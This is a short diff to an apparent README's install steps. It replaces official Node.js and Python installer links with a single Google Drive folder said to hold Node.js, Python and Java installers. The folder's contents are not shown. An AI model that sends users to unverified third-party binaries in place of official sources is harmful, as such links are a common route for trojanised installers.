@@ -7,9 +7,8 @@
 
 
 **First**
-Install [Node.js v14](https://nodejs.org/dist/v14.18.1/node-v14.18.1-x64.msi "Node.js")  and [Python 3.8](https://www.python.org/ftp/python/3.8.10/python-3.8.10-amd64.exe "Python 3.8").
 
-
+Download and install Node.js, Python, Java in [this LINK](https://drive.google.com/drive/folders/1JCV8mvFtIXyZU1_v2MubHQOKHQ_IluQK?usp=sharing "Google Driver").
 
 __Two__
 Download ZIP package and unzip.
